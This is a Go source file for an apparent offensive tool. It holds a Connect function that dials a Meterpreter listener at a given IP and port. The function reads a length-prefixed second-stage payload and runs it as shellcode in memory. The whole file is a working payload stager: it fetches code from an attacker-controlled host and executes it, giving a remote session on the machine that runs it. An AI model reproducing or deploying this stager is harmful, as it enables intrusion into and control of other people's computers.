package meter

import (
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"

	"../shell"
)

// Connect to meterpreter listener
// Refs:
//	- https://github.com/lesnuages/hershell
//  - https://buffered.io/posts/staged-vs-stageless-handlers/
//	- https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/
func Connect(ip string, port string) (bool, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		return false, err
	}
	defer conn.Close()
	// read 4 bytes from payload (size field)
	var length []byte = make([]byte, 4)
	if _, err = conn.Read(length); err != nil {
		return false, err
	}
	// read exactly size bytes
	s2length := int(binary.LittleEndian.Uint32(length[:]))
	fmt.Printf("Expecting %d bytes\n", s2length)
	s2buf, err := ioutil.ReadAll(io.LimitReader(conn, int64(s2length)))
	log.Printf("Read %d bytes\n", len(s2buf))
	// met.dll is a dll that has shellcode at the beginning that will bootstrap itself
	go shell.ExecSC(s2buf)
	return true, nil
}
